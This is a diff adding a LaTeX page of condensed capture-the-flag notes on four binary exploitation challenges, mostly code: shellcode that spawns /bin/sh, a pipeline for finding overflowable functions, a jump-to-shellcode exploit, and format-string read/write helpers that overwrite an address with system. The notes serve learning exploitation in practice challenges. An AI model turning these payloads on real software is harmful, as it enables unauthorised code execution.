@@ -1,0 +1,126 @@
+\documentclass[main.tex]{subfiles}
+
+\begin{document}
+
+% 20 - 20 - 24 - 27 - 30 - 33
+\begin{tikzpicture}
+\end{tikzpicture}
+
+\newpage
+
+\begin{minipage}[t]{0.49\textwidth}
+	\begin{enumerate}
+		\setlength{\parskip}{1em}
+		\item[\texttt{[\_]}] \texttt{[filtered-shellcode]} Trying to decompile the binary with Ghidra (or even IDA) is so weird and so time-consuming. The difficulty comes from the fact that the code manually forces stack alignments, so manual decompilation is a much better choice
+		\begin{python}
+			payload = asm(""" 
+			    xor eax, eax ; mov al, 0x9D   ;   mov ebx, esp ; add ebx, eax   ;
+			    push 0x00    ; mov edx, esp   ;   push ebx;nop ; mov ecx, esp   ;
+			    xor eax, eax ; mov al, 0x0B   ;   int 0x80
+			""") + b"/bin/sh\x00" # only one-or-two byte instructions are allowed
+		\end{python}
+		\item[\texttt{[\_]}] \texttt{[Bizz Fuzz]} The hardest part is \texttt{realizing} the need to write a tool to extract the vulnerable function; the rest is just a standard overflow vulnerability
+		\begin{bash}
+			# Extract and preprocess Ghidra decompiled functions that contain fgets
+			grep -e 'void FUN.*' -e 'char local.*' -e '  fgets.*'                  | grep -oP "FUN[^\(]+|\[.*\]|,\K.*(?=,)"                              | tr '\n' ' ' | sed -E 's/ (F)/\n\1/g'
+		\end{bash}
+		
+		\begin{minipage}[t]{0.46\textwidth}
+			\begin{python}
+				# Extract the vulnerable function
+				def cast2int(x):
+				    base = 16 if "x" in x else 10
+				    return int(x, base)
+				
+				line = file.readline().split()
+				while line:
+				    if len(line) > 2:
+				        FUNC, N, *L = line
+				        N = int(N[1:-1])
+				        L = map(cast2int, L)
+				        L = [x for x in L if x > N]
+				        if L:
+				            print(FUNC, N, L)
+				    line = file.readline().split()
+			\end{python}
+		\end{minipage}
+		\hfill
+		\begin{minipage}[t]{0.43\textwidth}
+			\begin{python}
+				# #inequality [: equality]
+				FUN_0811e15f() # #9
+				FUN_0814369d() # #8
+				FUN_0813d5dc() # #9
+				FUN_08144ba9() # #2
+				FUN_08131f64() # #23
+				FUN_0810aab4() # #0 : 5
+				FUN_0808ba1f() # #0 : 1
+				FUN_08049261() # fizzbuzz()
+				
+				def next_function(num):
+				    fail_in_solving()
+				    for i in range(num - 1):
+				        succeed_in_solving()
+				        fail_in_solving()
+			\end{python}
+		\end{minipage}
+		\item[\texttt{[\_]}] \texttt{[handoff]} Nothing’s interesting there! Is that type of problem called Jump-Oriented Programming \texttt{(JOP)}?
+		\begin{python}
+			p.sendlineafter(b"2.", b"2")
+			p.sendlineafter(b"Which", b"-10")
+			sh = "mov rdi, rax; add rdi, 30; mov rsi, 0; mov rdx, 0; mov rax, 59"
+			p.sendlineafter(b"What", asm(sh) + asm("syscall") + b"/bin/sh\x00")
+			
+			jmp_eax = 0x40116C
+			p.sendlineafter(b"3.", b"3")
+			sh = "add rax, 8; jmp rax; nop; nop; sub rax, 0x5a4; jmp rax"
+			p.sendlineafter(b"Thank you", flat(asm(sh), b"????", jmp_eax))
+		\end{python}
+		
+	\end{enumerate}
+\end{minipage}
+\hfill
+\begin{minipage}[t]{0.49\textwidth}
+	\begin{enumerate}
+		\setlength{\parskip}{1em}
+		\item[\texttt{[\_]}] \texttt{[fermat-strings]} My god, I forgot that \texttt{printf} can perform arbitrary writes! After searching for a while for format-string, I found a very useful resource: \href{https://hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html}{\texttt{HackTricks}}, which gives me some f-string tricks and new insight into ``re-entering the vulnerability''\\\\
+		\begin{minipage}[t]{0.50\textwidth}
+			\begin{python}
+				# def write(value, A):
+				F = "%{0:06}x%{1:03}$hhn"
+				
+				val, N = value, 0
+				while val:
+				    val, N = val >> 8, N + 1
+				
+				n, P = 0x25, ""
+				for i in range(N):
+				    d, n = (value - n) & 0xFF, value
+				    P += F.format(d, 43 + N * 2 + i)
+				    value >>= 8
+				
+				return P, [A + i for i in range(N)]
+			\end{python}
+		\end{minipage}
+		\hfill
+		\begin{minipage}[t]{0.49\textwidth}
+			\begin{python}
+				# def read(A):
+				F = "%{0:03}$hhs????????"
+				return F.format(45), A
+				
+				# def round(F, *args):
+				p.sendlineafter(b"A:", b"37")
+				p.sendlineafter(b"B:", flat(b"30072003", F(*args)))
+				
+				#def send_payload(p):
+				round(write, 0x400837, 0x601040)
+				round(read, 0x601050)
+				...
+				round(write, SYSTEM, 0x601058)
+				p.sendlineafter(b"A:", b"/bin/sh")
+			\end{python}
+		\end{minipage}
+	\end{enumerate}
+\end{minipage}
+\end{document}
